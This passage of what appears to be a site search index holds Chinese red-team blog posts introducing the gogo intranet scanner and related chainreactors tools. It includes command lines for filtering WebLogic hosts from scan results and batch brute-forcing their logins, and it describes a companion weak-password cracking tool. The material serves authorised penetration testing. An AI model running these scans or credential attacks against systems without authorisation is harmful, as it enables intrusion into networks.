</ul>"},{"location":"blog/2024/08/25/spray-best-practices/#\u5176\u4ed6","title":"\u5176\u4ed6","text":""},{"location":"blog/2024/08/25/spray-best-practices/#crtm","title":"CRTM","text":"<p>\u5c0f\u5de5\u5177\u5c31\u4e0d\u7f16\u5199\u72ec\u7acb\u7684\u7f16\u5199\u76f8\u5173\u6587\u6863\u4e0e\u535a\u5ba2\u4e86</p> <p>https://github.com/chainreactors/crtm</p> <p>crtm\u662ffork\u4e86projectdiscovery\u7684pdtm\u7684\u5de5\u5177\u7ba1\u7406\u5668. </p> <p>\u80fd\u7528\u6765\u7ba1\u7406chainreactor\u76f8\u5173\u5de5\u5177\u94fe\u7684\u66f4\u65b0\u548c\u5b89\u88c5\u4ee5\u53ca\u73af\u5883\u53d8\u91cf.</p> <p></p>"},{"location":"blog/2024/08/25/spray-best-practices/#mapping","title":"mapping","text":"<p>mapping \u662fredboot\u8ba1\u5212\u4e2d\u7684\u4e09\u6761\u652f\u7ebf\u4e4b\u4e00, \u7528\u6765\u5b9e\u73b0\u7ea2\u961f\u5411\u7684ASM.   spray, fingers, gogo\u7b49\u7b49\u90fd\u662fmapping\u4e2d\u7684\u4e00\u4e2a\u7ec4\u4ef6. </p> <p>mapping\u73b0\u5728\u63d0\u4f9b\u4e86\u9884\u89c8\u6587\u6863\u4e0e\u8bbe\u8ba1\u7406\u5ff5, \u53ef\u4ee5\u5728 https://chainreactors.github.io/wiki/mapping/ \u4e2d\u9605\u8bfb</p>"},{"location":"blog/2022/11/15/gogo-introduce/","title":"\u7ecf\u8fc7\u5b9e\u6218\u6253\u78e8\u5185\u7f51\u81ea\u52a8\u5316\u5f15\u64ce","text":""},{"location":"blog/2022/11/15/gogo-introduce/#repo","title":"repo","text":"<p>\u9879\u76ee\u94fe\u63a5</p> <p>\u672c\u4f53: https://github.com/chainreactors/gogo</p> <p>\u89c4\u5219\u5e93: https://github.com/chainreactors/gogo-templates (\u5c06\u5728\u4e00\u5468\u5185\u8bbe\u7f6e\u4e3apublic)</p> <p>\u672c\u6587\u53ea\u4ecb\u7ecd\u4e00\u4e9b\u7279\u6027, \u5177\u4f53\u7684\u4f7f\u7528\u4ee5\u53ca\u4f7f\u7528\u6587\u6863\u8bf7\u89c1\u9879\u76ee\u4ed3\u5e93</p>"},{"location":"blog/2022/11/15/gogo-introduce/#\u80cc\u666f","title":"\u80cc\u666f","text":"<p>\u5728\u7ea2\u961f\u6700\u5f00\u59cb\u7684\u4e24\u5e74, \u5e76\u6ca1\u6709\u76f8\u5173\u7684\u5de5\u5177, \u5916\u7f51\u626b\u63cf\u7aef\u53e3\u4f7f\u7528\u7684\u8fd8\u662fnmap, masscan. \u5185\u7f51\u5219\u51e0\u4e4e\u65e0\u80fd\u4e3a\u529b, \u6709\u4eba\u4f7f\u7528C\u5199\u7684\u4e00\u4e9b\u5c0f\u5de5\u5177, \u6709\u4eba\u901a\u8fc7python\u5199\u4e86\u5355\u6587\u4ef6\u7684allin, \u4e5f\u6709\u4eba\u6253\u5305\u4e86\u5355\u6587\u4ef6\u7248\u672c\u7684nmap\u4e0emasscan.</p> <p>\u4e4b\u540e\u6709\u4e86serverscan, \u4e0d\u8fc7\u8001\u7248\u672c\u7f3a\u5c11\u7ef4\u62a4, \u5728\u8bbe\u8ba1\u4e0a\u5b58\u5728\u7f3a\u9677, \u65b0\u7248\u672c\u4e00\u76f4\u6ca1\u6709\u516c\u5f00, \u5728\u626b\u63cf\u5c11\u91cf\u76ee\u6807\u65f6\u6548\u679c\u4e0d\u9519, \u76ee\u6807\u4e00\u5927, \u5219\u901f\u5ea6\u96be\u4ee5\u63a5\u53d7\u5e76\u4e14\u4f1a\u65f6\u4e0d\u65f6\u7684\u5d29\u6e83.</p> <p>\u4e5f\u56e0\u4e3a\u6b64, \u5f00\u59cb\u7f16\u5199\u81ea\u5df1\u7684\u626b\u63cf\u5668, \u5f88\u5feb\u5c31\u5728\u540c\u4e8b\u624b\u4e2d\u8bde\u751f\u4e86\u7b2c\u4e00\u4e2ademo, \u6700\u5f00\u59cb\u7684\u5b9a\u4f4d\u5927\u6982\u662f\u4e00\u4e2a\u6ca1\u6709bug\u7684serverscan, \u90a3\u65f6\u5019\u53ebgetitle, \u8fd8\u771f\u7684\u53ea\u80fdget title. \u4f46\u5199\u7740\u5199\u7740\u5c31\u6536\u4e0d\u4f4f\u4e86, \u6700\u7ec8\u53d8\u6210\u4e86\u4e00\u4e2a\u80fd\u7f51\u6bb5\u53d1\u73b0, \u7aef\u53e3\u626b\u63cf, \u6307\u7eb9\u8bc6\u522b, \u6f0f\u6d1e\u63a2\u6d4b\u7684\u626b\u63cf\u5f15\u64ce. \u51e0\u4e4e\u8986\u76d6\u4e86\u5185\u7f51\u626b\u63cf\u76f8\u5173\u7684\u7edd\u5927\u591a\u6570\u573a\u666f.</p> <p>\u518d\u540e\u6765\u8bde\u751f\u4e86kscan, fscan\u7b49\u7c7b\u4f3c\u5b9a\u4f4d\u7684\u5de5\u5177, \u5728\u8fed\u4ee3\u7684\u8fc7\u7a0b\u4e2d, gogo\u4eceladon, kscan, cube,nuclei\u7b49\u5730\u65b9\u501f\u9274\u4e86\u4e00\u4e9b\u601d\u8def, \u4e5f\u590d\u5236\u4e86\u4e00\u4e9b\u4ee3\u7801(\u4e3b\u8981\u662f\u7279\u6b8a\u7aef\u53e3\u7684\u626b\u63cf\u63d2\u4ef6).  </p> <p>\u73b0\u5728\u7684gogo, \u5b9a\u4f4d\u5df2\u7ecf\u4e0d\u540c\u4e8eserverscan, fscan\u7b49\u5de5\u5177, \u5b83\u662f\u4e00\u4e2a\u5185\u7f51\u7684\u81ea\u52a8\u5316\u5f15\u64ce, \u4fdd\u7559\u4e86\u6781\u5f3a\u7684\u53ef\u63a7\u6027\u4e0e\u53ef\u62d3\u5c55\u6027, \u80fd\u5bf9\u4ed8fscan, kscan,netspy\u7b49\u90fd\u65e0\u80fd\u4e3a\u529b\u7684\u590d\u6742\u4f7f\u7528\u573a\u666f.</p> <p>\u5728\u7ea2\u961f\u9879\u76ee\u4e0ehw\u4e2d\u4e0d\u65ad\u8fed\u4ee3\u4e86100\u591a\u4e2a\u7248\u672c, \u8fd11000\u4e2acommit, \u6162\u6162\u52a0\u5165\u4e86\u975e\u5e38\u591a\u529f\u80fd\u4e0e\u5947\u601d\u5999\u60f3 \u4ee5\u53ca\u5b9e\u6218\u4e2d\u7684\u7ecf\u9a8c\u79ef\u7d2f.</p> <p>gogo\u5728\u8bbe\u8ba1\u4e0a\u4f1a\u6709\u4e00\u4e9b\u53d6\u820d, \u4e00\u4e9b\u5176\u4ed6\u5de5\u5177\u6709\u7684\u529f\u80fd, gogo\u4e0d\u4e00\u5b9a\u4f1a\u90fd\u53bb\u5b9e\u73b0, \u4f46\u4e00\u5b9a\u4f1a\u63d0\u4f9b\u5176\u4ed6\u89e3\u51b3\u65b9\u6848. \u8fd9\u4e3b\u8981\u662f\u4e3a\u4e86\u4fdd\u8bc1gogo\u8db3\u591f\u4fbf\u643a, \u8db3\u591f\u4f18\u96c5\u4ee5\u53ca\u8bbe\u8ba1\u4e0a\u7684\u7edf\u4e00.</p>"},{"location":"blog/2022/11/15/gogo-introduce/#features","title":"Features","text":"<p>\u7ecf\u8fc7\u63a5\u8fd1\u4e24\u5e74\u7684\u5b9e\u6218\u6253\u78e8,  \u5c3d\u53ef\u80fd\u5730\u4f18\u5316\u7528\u6237\u4f53\u9a8c\u4e0e\u5404\u79cd\u7ec6\u8282. \u4f46\u968f\u7740\u529f\u80fd\u8d8a\u6765\u8d8a\u590d\u6742, \u4f9d\u65e7\u662f\u4e00\u4e2a\u5b66\u4e60\u6210\u672c\u76f8\u5bf9\u8f83\u9ad8\u7684\u5de5\u5177.</p>"},{"location":"blog/2022/11/15/gogo-introduce/#\u542f\u53d1\u5f0f\u626b\u63cf","title":"\u542f\u53d1\u5f0f\u626b\u63cf","text":"<p>\u5728nmap,masscan\u90a3\u4e2a\u5e74\u4ee3, \u5bf9\u5185\u7f51\u7684\u626b\u63cf\u5f88\u5c11\u4f1a\u8d85\u8fc7c\u6bb5, \u66f4\u522b\u8bf4a\u6bb5\u8fd9\u79cd\u5728\u5f53\u65f6\u51e0\u4e4e\u4e0d\u53ef\u80fd\u5b8c\u6210\u7684\u4efb\u52a1. \u5c31\u7b97\u662f\u73b0\u5728\u7684fscan, \u6216\u8005\u76f8\u5173\u7279\u5316\u7684\u5de5\u5177netspy\u4e5f\u4e0d\u80fd\u5f88\u597d\u7684\u5b9e\u73b0, \u53ea\u505c\u7559\u5728\u52c9\u5f3a\u80fd\u7528\u7684\u9636\u6bb5.</p> <p>\u800c\u73b0\u5728, \u5bf9b\u6bb5\u7684\u626b\u63cf\u6d4b\u7ed8\u5df2\u7ecf\u662f\u8f7b\u800c\u6613\u4e3e, \u6211\u4eec\u53ef\u4ee5\u628a\u76ee\u5149\u653e\u5230\u5bf9a\u6bb5\u751a\u81f3\u5bf9\u5168\u7f51\u7684\u6d4b\u7ed8.</p> <p>gogo\u5728\u5f88\u65e9\u5c31\u96c6\u6210\u4e86\u6839\u636e\u7ecf\u9a8c\u516c\u5f0f\u7684\u9012\u5f52\u4e0b\u964d\u53bb\u53d1\u73b0\u7f51\u6bb5. \u5e76\u4e14\u901a\u8fc7\u751f\u6210\u5668\u5bf9\u626b\u63cf\u903b\u8f91\u89e3\u8026, \u53ef\u4ee5\u4efb\u610f\u7ec4\u5408\u4e0d\u540c\u7684\u626b\u63cf\u9636\u6bb5. \u6700\u7ec8\u5b9e\u73b0\u5bf9\u4efb\u610f\u7f51\u6bb5\u7684\u667a\u80fd\u63a2\u6d3b\u4e0e\u6d4b\u8bd5</p> <p>\u4f8b\u5982</p> <ul> <li>\u60f3\u7ed8\u5236\u4e00\u4e0b\u5f53\u524d\u5165\u53e3\u70b9\u80fd\u901a\u7684\u7f51\u7edc\u62d3\u6251 (\u5927\u7ea630\u5206\u949f)</li> <li>\u53ea\u60f3\u770b\u770b10\u6bb5\u5185\u7f51\u91cc\u6709\u591a\u4e2aB\u6bb5\u88ab\u4f7f\u7528\u4e86 (\u5927\u7ea630\u79d2)</li> <li>\u53ea\u60f3\u770b\u770b10\u7f51\u6bb5\u4e2d\u6709\u591a\u5c11ip\u5b58\u6d3b (\u5927\u7ea630\u5206\u949f)</li> <li>\u60f3\u626b\u63cf\u4e0b10\u6bb5\u4e2d\u7684\u8d44\u4ea7 (\u770b\u524d\u4e24\u9636\u6bb5\u5b58\u6d3b\u7684\u8d44\u4ea7\u6570\u91cf, \u5927\u7ea61-2\u5c0f\u65f6)</li> <li>\u4e0d\u4ec5\u60f3\u626b\u63cf\u8d44\u4ea7, \u8fd8\u60f3\u8bc6\u522b\u4e0b\u6307\u7eb9, \u63a2\u6d4b\u4e0b\u6f0f\u6d1e (\u57fa\u672c\u548c\u63a2\u6d4b\u8d44\u4ea7\u65f6\u95f4\u76f8\u540c, \u91c7\u7528\u6700\u5c0f\u53d1\u5305\u539f\u5219,\u63a2\u6d4b\u6307\u7eb9\u4e0e\u6f0f\u6d1e\u4e0d\u4f1a\u591a\u8017\u65f6\u591a\u5c11, \u5927\u7ea6\u591a20-30%\u8017\u65f6)</li> <li>\u6211\u60f3\u4e00\u53e3\u6c14\u628a10,172,192\u5185\u7f51\u5168\u63a2\u6d4b\u4e86, \u5e76\u8f93\u51fa\u62a5\u544a (\u770b\u8d44\u4ea7\u6570\u91cf, \u5927\u7ea61-2\u5c0f\u65f6)</li> <li>......</li> </ul> <p>\u5f53\u7136, \u8fd9\u91cc\u7684\u7f51\u6bb5\u53ef\u4ee5\u81ea\u5b9a\u4e49, \u4e0d\u4e00\u5b9a\u662f10.  \u5927\u81f4\u53ef\u4ee5\u7406\u89e3\u4e3afscan\u4e0enetspy\u7684\u7ed3\u5408, \u5b9e\u9645\u4e0a\u4f1a\u66f4\u52a0\u590d\u6742\u4e00\u70b9.</p> <p>\u7528\u547d\u4ee4\u884c\u6784\u9020\u8fd9\u4e9b\u573a\u666f\u8f83\u4e3a\u590d\u6742, \u7ecf\u8fc7\u4e0d\u5c11\u670b\u53cb\u8bd5\u7528\u5410\u69fd\u540e, \u6dfb\u52a0\u4e86workflow, \u53ea\u9700\u8981\u4e00\u4e2a\u53c2\u6570\u5373\u53ef\u8986\u76d6\u7edd\u5927\u591a\u6570\u5e38\u89c1\u7684\u4f7f\u7528\u573a\u666f. \u5177\u4f53\u7684\u4f7f\u7528\u8bf4\u660e\u89c1\u4ed3\u5e93\u4e2d\u7684README.md\u4e0e\u8bbe\u8ba1\u6587\u6863.</p>"},{"location":"blog/2022/11/15/gogo-introduce/#\u4fbf\u6377\u7684\u7aef\u53e3\u914d\u7f6e","title":"\u4fbf\u6377\u7684\u7aef\u53e3\u914d\u7f6e","text":"<p>\u521a\u624d\u63d0\u5230\u7684\u542f\u53d1\u5f0f\u626b\u63cf, \u4e3b\u8981\u662f\u5728\u626b\u63cf\u903b\u8f91\u4e0a\u7684\u914d\u7f6e, \u800c\u5bf9\u4e8e\u5177\u4f53\u7aef\u53e3\u8d44\u4ea7, gogo\u4e5f\u63d0\u4f9b\u4e86\u6781\u5176\u65b9\u4fbf\u7684\u7aef\u53e3\u9884\u8bbe,</p> <p>\u4f8b\u5982\u6211\u8981\u626b\u63cf\u5e38\u89c1\u7684http\u670d\u52a1, \u6307\u5b9a<code>-p top3</code> \u6216 <code>-p top2</code> \u5373\u53ef. \u5982\u679c\u8981\u626b\u63cf\u6570\u636e\u5e93, \u5219\u662f<code>-p db</code></p> <p>\u5982\u679c\u6211\u540c\u65f6\u8981\u4f7f\u7528\u591a\u4e2a\u9884\u8bbe, \u90a3\u4e48<code>-p top3,db,win</code></p> <p>\u5982\u679c\u6211\u8981\u4f7f\u7528\u591a\u4e2a\u9884\u8bbe, \u53c8\u8981\u6307\u5b9a\u67d0\u4e2a\u533a\u95f4\u7f51\u6bb5. \u90a3\u4e48 <code>-p top3,db,win,40000-50000</code></p> <p>\u901a\u8fc7name\u4e0etags\u7684\u4ea4\u53c9\u7ba1\u7406, \u80fd\u5feb\u901f\u914d\u7f6e\u5404\u79cd\u4f7f\u7528\u573a\u666f.</p> <p>\u5982\u679c\u8981\u6dfb\u52a0\u9884\u8bbe, \u53ef\u4ee5\u5728github\u7684gogo-template\u4e2d\u7684port.yaml\u63d0\u4ea4pr.</p>"},{"location":"blog/2022/11/15/gogo-introduce/#\u6307\u7eb9\u8bc6\u522b","title":"\u6307\u7eb9\u8bc6\u522b","text":"<p>gogo\u7684\u6307\u7eb9\u4e0e\u6f0f\u6d1e\u90fd\u5c06\u5b8c\u5168\u4ee5dsl\u7684\u65b9\u5f0f\u5b9e\u73b0, \u8bf4\u4eba\u8bdd\u5c31\u662f \u901a\u8fc7yaml\u914d\u7f6e.</p> <p>\u6307\u7eb9\u662f\u6211\u81ea\u884c\u8bbe\u8ba1\u7684\u89c4\u5219\u5e93\u683c\u5f0f\u4e0e\u5f15\u64ce, \u56e0\u4e3a\u5e76\u6ca1\u6709\u627e\u5230\u4e00\u4e2a\u5b8c\u5168\u80fd\u6ee1\u8db3\u6211\u9700\u6c42\u7684\u89c4\u5219\u5e93\u4e0e\u5f15\u64ce, \u6240\u4ee5\u53ea\u80fd\u81ea\u5df1\u5199\u4e00\u4e2a, \u6574\u5408\u4e86fofa\u7684\u89c4\u5219\u5e93, \u4ee5\u53cafingerprinthub, fscan, kscan, allin\u4e2d\u7684\u4e00\u90e8\u5206\u89c4\u5219.  </p> <p>\u6307\u7eb9\u8bc6\u522b\u770b\u8d77\u6765\u7b80\u5355, \u4f46\u6211\u4eec\u5728\u5b9e\u6218\u4e2d\u9047\u5230\u4e86\u4e00\u4e2a\u63a5\u4e00\u4e2a\u9884\u671f\u5916\u7684\u95ee\u9898. \u6307\u7eb9\u8bc6\u522b\u5e76\u4e0d\u662f\u53ea\u5339\u914d\u5173\u952e\u5b57\u5c31\u80fd\u505a\u597d.</p> <p>\u4f8b\u5982, \u67d0\u4e2ahttp\u7ad9, \u8bbf\u95ee\u4f1a\u901a\u8fc730x\u8df3\u8f6c,  \u4f46\u662f\u8df3\u8f6c\u8fc7\u53bb\u7684\u7ad9\u662f\u4e2a404\u9875\u9762(\u9ed8\u8ba4\u914d\u7f6e\u7684\u84dd\u51ccoa).</p> <p>\u53c8\u4f8b\u5982, \u67d0\u4e2ahttp\u7ad9, \u76f4\u63a5\u8bbf\u95ee80\u7aef\u53e3\u8fd4\u56de\u7684\u662f\u4e00\u4e2a\u901a\u8fc7js\u8fdb\u884c\u8df3\u8f6c\u7684\u9875\u9762, \u8fd9\u79cd\u60c5\u51b5\u6307\u7eb9\u5339\u914d\u4e0d\u4e00\u5b9a\u80fd\u751f\u6548.</p> <p>\u518d\u4f8b\u5982, \u67d0\u4e2ahttp\u7ad9, \u4e00\u8bbf\u95ee\u5c31\u4f1a\u4e0b\u8f7d\u6587\u4ef6, \u90a3\u4e2a\u6587\u4ef6\u53ef\u80fd\u6709\u51e0\u767eM\u5927\u5c0f,</p> <p>\u5982\u679c\u662f\u975ehttp\u534f\u8bae\u7684\u7aef\u53e3, \u90a3\u60c5\u51b5\u5c31\u66f4\u591a\u4e86.</p> <p>\u4f8b\u5982, \u67d0\u4e9b\u670d\u52a1, \u5efa\u7acb\u5b8c\u63e1\u624b\u5c31\u4f1a\u8fd4\u56debanner, \u5982\u679c\u4f60\u53d1\u9001\u4e86\u5b83\u65e0\u6cd5\u8bc6\u522b\u7684\u6570\u636e, \u4ed6\u5c31\u4f1areset tcp\u94fe\u63a5(SSH).</p> <p>\u53c8\u4f8b\u5982, \u5982\u679c\u5bf9\u67d0\u4e9b\u670d\u52a1\u53d1\u9001\u4e86\u4ed6\u65e0\u6cd5\u8bc6\u522b\u7684\u6570\u636e, \u4ed6\u4e0d\u4f1a\u65ad\u5f00tcp\u94fe\u63a5, \u4f46\u662f\u4e0d\u518d\u4f1a\u8fd4\u56de\u6570\u636e(MSSQL).</p> <p>\u518d\u4f8b\u5982, \u67d0\u4e9b\u534f\u8bae\u6709\u5404\u79cd\u5404\u6837\u7684\u53d1\u884c\u7248, \u6bcf\u4e2a\u53d1\u884c\u7248\u7684banner\u90fd\u4e0d\u540c, \u5e76\u4e14\u6ca1\u6709\u660e\u663e\u7684\u89c4\u5f8b(FTP\u4e0eTELNET).</p> <p>\u597d\u5728nmap\u5df2\u7ecf\u89e3\u51b3\u4e86\u670d\u52a1\u6307\u7eb9\u7684\u5927\u90e8\u5206\u95ee\u9898, \u53ea\u662f\u5982\u679c\u76f4\u63a5\u4f7f\u7528nmap\u7684\u6307\u7eb9\u5e93, \u8fc7\u4e8e\u5e9e\u5927\u7684\u6307\u7eb9\u5e93\u4f1a\u5e26\u6765\u4e0d\u5fc5\u8981\u7684\u6027\u80fd\u6d88\u8017.  \u67d0\u4e9b\u626b\u63cf\u5668\u5c31\u76f4\u63a5\u4f7f\u7528nmap\u7684\u6307\u7eb9\u5e93, \u5bfc\u81f4\u6307\u7eb9\u5339\u914d\u7684\u65f6\u95f4\u5927\u4e8e\u626b\u63cf\u7684\u65f6\u95f4. \u8ba9\u6211\u80fd\u628a\u6ce8\u610f\u529b\u96c6\u4e2d\u5728http\u6307\u7eb9\u8bc6\u522b\u4e0a.</p> <p>\u5149\u662fhttp\u6307\u7eb9\u8bc6\u522b\u7684\u7279\u6b8a\u60c5\u51b5\u751a\u81f3\u8d85\u8fc7\u4e86gogo\u80fd\u5904\u7406\u7684\u8303\u56f4, \u5982\u679c\u52a0\u4e0a\u8fd9\u4e9b\u529f\u80fd, gogo\u4e0d\u53ef\u907f\u514d\u7684\u4f1a\u53d8\u5f97\u81c3\u80bf, \u56e0\u6b64, \u90e8\u5206http\u6307\u7eb9\u8bc6\u522b\u7684\u529f\u80fd, \u7279\u522b\u662f\u4e3b\u52a8\u6307\u7eb9\u63a2\u6d4b\u76f8\u5173\u529f\u80fd, \u6211\u5c06\u5176\u79fb\u690d\u5230\u53e6\u4e00\u6b3e\u5de5\u4ef6\u4e2d.  \u53ea\u5728gogo\u4e2d\u4fdd\u7559\u6700\u57fa\u672c\u7684\u4e3b\u52a8\u8bc6\u522b. \u5728\u5185\u7f51\u7edd\u5927\u591a\u6570\u60c5\u51b5, \u6f0f\u62a5\u4e00\u4e24\u4e2a\u6307\u7eb9\u5e76\u4e0d\u4f1a\u5f71\u54cd\u6211\u4eec\u7684\u540e\u7eed\u64cd\u4f5c. (\u6bd5\u7adf\u5c31\u7b97\u6f0f\u62a5\u4e86, \u5bf9\u666e\u901a\u7528\u6237\u6765\u8bf4\u4e5f\u662f\u6ca1\u6709\u611f\u77e5\u7684lol)</p>"},{"location":"blog/2022/11/15/gogo-introduce/#\u6f0f\u6d1e\u63a2\u6d4b","title":"\u6f0f\u6d1e\u63a2\u6d4b","text":"<p>\u6f0f\u6d1e\u626b\u63cf\u76f8\u5173\u529f\u80fd\u4ecenuclei\u5b66\u5230\u4e86\u4e0d\u5c11\u4e1c\u897f, dsl\u8bed\u6cd5\u4e5f\u76f4\u63a5\u4f7f\u7528\u4e86nuclei, \u4f46\u4e3a\u4e86\u66f4\u52a0\u9002\u914d\u5185\u7f51\u573a\u666f, \u505a\u4e86\u4e0d\u5c11\u6539\u52a8, \u5e76\u4e0d\u80fd\u5b8c\u5168\u517c\u5bb9.  \u8003\u8651\u5230\u4e86\u5185\u7f51\u73af\u5883, \u6211\u5220\u9664\u4e86\u4e00\u90e8\u5206\u4e0d\u5fc5\u8981\u7684\u529f\u80fd(\u52a8\u6001dsl, oast\u7b49), \u4ee5\u7b80\u5316\u4e8c\u8fdb\u5236\u6587\u4ef6\u5927\u5c0f.  \u4e5f\u6dfb\u52a0\u4e86\u4e00\u4e9b\u529f\u80fd, \u8be6\u60c5\u89c1github\u4ed3\u5e93\u4e2d\u7684poc.md,</p> <p>\u7edd\u5927\u591a\u6570poc\u90fd\u53ef\u4ee5\u4ecenuclei\u4e2d\u79fb\u690dpoc, \u53ea\u9700\u8981\u505a\u4e00\u4e9b\u7b80\u5355\u4fee\u6539\u4e0e\u6d4b\u8bd5\u4fbf\u53ef\u4ee5\u5feb\u901f\u52a0\u5165\u5230gogo\u4e2d.  \u4e0d\u8fc7\u4e3a\u4e86\u4fdd\u8bc1poc\u8d28\u91cf\u4ee5\u53ca\u5185\u7f51\u4f7f\u7528\u573a\u666f, \u52a0\u5165\u5230gogo\u4e2d\u7684\u6f0f\u6d1e\u9700\u8981\u4e00\u5b9a\u7684\u7b5b\u9009.</p> <p>\u8fd9\u91cc\u7684\u8003\u91cf\u662f, \u7ea2\u961f\u573a\u666f\u4e2d, \u5bf9\u4e8e\u5404\u79cdoa, cms, \u4e0d\u5c11\u4eba\u90fd\u624b\u63e10day, \u53ea\u9700\u8981\u505a\u6307\u7eb9\u8bc6\u522b\u4e0e\u7248\u672c\u8bc6\u522b, \u9700\u8981\u6253poc\u7684\u60c5\u51b5\u4e0d\u592a\u591a. \u5bf9\u4e8e\u4e00\u4e9b\u8bbe\u5907, \u5f00\u6e90\u7ec4\u4ef6 \u624b\u52a8\u4e00\u53f0\u4e00\u53f0\u6d4b\u8bd5\u5f31\u53e3\u4ee4\u4e0d\u592a\u73b0\u5b9e, \u9700\u8981\u81ea\u52a8\u5316\u63a2\u6d4b\u9ed8\u8ba4\u5bc6\u7801\u4ee5\u53ca\u5f00\u6e90\u7ec4\u4ef6\u7684nday.</p> <p>\u56e0\u6b64, gogo\u7684\u6f0f\u6d1e\u5e93\u4e0d\u4f1a\u662f\u4e00\u4e2a\u5927\u800c\u5168\u7684\u6f0f\u6d1e\u5e93, \u5982\u679c\u6709\u5927\u800c\u5168\u7684\u9700\u6c42, \u53ef\u4ee5\u76f4\u63a5\u4f7f\u7528nuclei.</p> <p>\u6211\u60f3\u901a\u8fc7\u517c\u5bb9nuclei\u7684\u751f\u6001, \u8ba9\u81ea\u5df1\u7ef4\u62a4poc\u5e93\u7701\u529b\u4e00\u4e9b, \u73b0\u5728\u57fa\u672c\u5904\u4e8e\u6709\u4eba\u53cd\u9988\u5e38\u89c1\u4ec0\u4e48poc, \u6211\u5c31\u6dfb\u52a0\u5bf9\u5e94\u7684poc, \u7ecf\u8fc7\u4e00\u6bb5\u65f6\u95f4\u7684\u7ef4\u62a4, \u57fa\u672c\u4e0a\u5e38\u89c1\u7684poc\u90fd\u80fd\u9002\u914d\u597d. \u9700\u8981\u5404\u4f4d\u5927\u54e5\u5e2e\u6211\u5b9e\u73b0.</p> <p>\u8fd9\u91cc\u4f60\u4e5f\u4f1a\u53d1\u73b0, \u5185\u7f51\u9664\u4e86\u81ea\u52a8\u5316\u6253\u4e00\u4e9bpoc, \u8fd8\u53ef\u4ee5\u628a\u9ed8\u8ba4\u53e3\u4ee4\u8fd9\u90e8\u5206\u7ed9\u5b9e\u73b0\u4e86, \u4e00\u4e9b\u5e38\u89c1\u7684\u7f51\u7edc\u8bbe\u5907web\u7aef, web\u5e94\u7528, \u4e0d\u518d\u9700\u8981\u624b\u52a8\u6d4b\u8bd5. \u4e0e\u5176\u7ef4\u62a4\u4e00\u4e2a\u9ed8\u8ba4\u53e3\u4ee4\u5e93, \u4e0d\u5982\u76f4\u63a5\u81ea\u52a8\u5316\u63a2\u6d4b.</p>"},{"location":"blog/2022/11/15/gogo-introduce/#\u81ea\u52a8\u5316","title":"\u81ea\u52a8\u5316","text":"<p>\u5047\u8bbe\u8fd9\u6837\u4e00\u4e2a\u573a\u666f, \u5185\u7f51\u4e2d\u626b\u63cf\u53d1\u73b0\u4e86\u4e0a\u767e\u4e2aweblogic, \u7136\u540e\u901a\u8fc7\u5176\u4e2d\u4e00\u53f0\u6f0f\u6d1e\u89e3\u5f00\u4e86\u660e\u6587\u7684weblogic\u5bc6\u7801. \u8fd9\u4e2a\u65f6\u5019, \u5c31\u9700\u8981\u5199\u4e00\u4e2a\u81ea\u52a8\u5316\u811a\u672c. \u800cgogo\u63d0\u4f9b\u4e86\u53ef\u590d\u7528\u7684\u811a\u672c\u652f\u6301.</p> <p>\u7b2c\u4e00\u6b65, \u4ece\u626b\u63cf\u7ed3\u679c\u4e2d\u8fc7\u6ee4\u51faweblogic</p> <pre><code>gogo -F result.dat --filter frame::weblogic -o json -f weblogic.dat\n</code></pre> <p>\u7b2c\u4e8c\u6b65, \u8c03\u7528poc,\u5e76\u66ff\u6362\u76f8\u5173\u53c2\u6570\u5b9e\u73b0\u6279\u91cf\u7206\u7834</p> <pre><code>gogo -l weblogic.dat -E weblogic-login --payload username=test --payload password=test\n</code></pre> <p>\u5982\u679c\u662f\u67d0\u4e9b\u76f8\u5bf9\u7f55\u89c1\u7684\u8bbe\u5907. \u5219\u53ea\u9700\u8981\u6293\u5305\u5e76\u7f16\u5199\u4e00\u4e2a\u7b80\u5355\u7684nuclei poc.</p> <p>\u53c2\u8003\u5176\u4ed6poc, \u7f16\u5199\u5bf9\u5e94\u7684yaml\u6587\u4ef6, \u7136\u540e\u901a\u8fc7yaml2json.py\u8f6c\u4e3abase64\u7f16\u7801\u7684json\u683c\u5f0f, \u4f7f\u7528gogo\u52a8\u6001\u52a0\u8f7dpoc</p> <pre><code>gogo -l target.dat --ef [base64] -E custom_poc --payload username=test --payload password=test\n</code></pre> <p>\u901a\u8fc7nuclei poc\u4e0egogo\u7ed3\u5408, \u53ef\u4ee5\u5b9e\u73b0\u7edd\u5927\u90e8\u5206\u573a\u666f\u7684\u5185\u7f51web\u81ea\u52a8\u5316\u63a2\u6d4b. \u5e76\u6bcf\u4e00\u6b21\u7684\u79ef\u7d2f\u90fd\u5c06\u53d8\u6210\u53ef\u590d\u7528\u7684\u80fd\u529b, \u4ee5\u5f85\u4e0b\u4e00\u6b21\u9047\u5230\u76f8\u540c\u7684\u573a\u666f\u63d0\u9ad8\u6548\u7387.</p>"},{"location":"blog/2022/11/15/gogo-introduce/#\u4e3a\u4ec0\u4e48\u6ca1\u6709\u670d\u52a1\u7684\u53e3\u4ee4\u7206\u7834","title":"\u4e3a\u4ec0\u4e48\u6ca1\u6709\u670d\u52a1\u7684\u53e3\u4ee4\u7206\u7834","text":"<p>\u521a\u624d\u63d0\u5230\u4e86, \u5bf9web\u7aef\u9ed8\u8ba4\u53e3\u4ee4\u7684\u7206\u7834gogo\u53ef\u4ee5\u5b9e\u73b0, \u4f46\u6709\u5f88\u591a\u4eba\u95ee\u6211, \u4e3a\u4ec0\u4e48\u4e0d\u628assh, mysql\u4e4b\u7c7b\u7684\u7206\u7834\u4e5f\u505a\u8fdb\u53bb?</p> <p>\u6700\u521d\u6211\u4e5f\u662f\u8fd9\u4e48\u60f3\u7684, \u4f46\u662f\u8003\u8651\u5230\u52a0\u4e0a\u4e86\u8fd9\u4e9b\u529f\u80fd, \u4e8c\u8fdb\u5236\u6587\u4ef6\u548c\u4ee3\u7801\u4f1a\u53d8\u5f97\u81c3\u80bf, \u5e76\u4e14\u8fd9\u4e9b\u529f\u80fd\u5176\u5b9e\u53ef\u4ee5\u4ee5\u53e6\u4e00\u79cd\u5f62\u5f0f\u5b9e\u73b0. \u6700\u7ec8\u6211\u4eec\u51b3\u5b9a\u53e6\u8d77\u7089\u7076, \u7ef4\u62a4\u4e86\u53e6\u5916\u4e00\u4e2a\u5de5\u5177 zombie, \u4e3b\u8981\u7528\u4e8e\u6279\u91cf\u7684\u670d\u52a1\u5f31\u53e3\u4ee4\u7206\u7834\u4e0e\u5229\u7528. gogo\u4e0ezombie\u53ef\u4ee5\u8054\u52a8, gogo\u5bfc\u51fa\u7684zombie\u53ef\u8bc6\u522b\u7684\u683c\u5f0f, 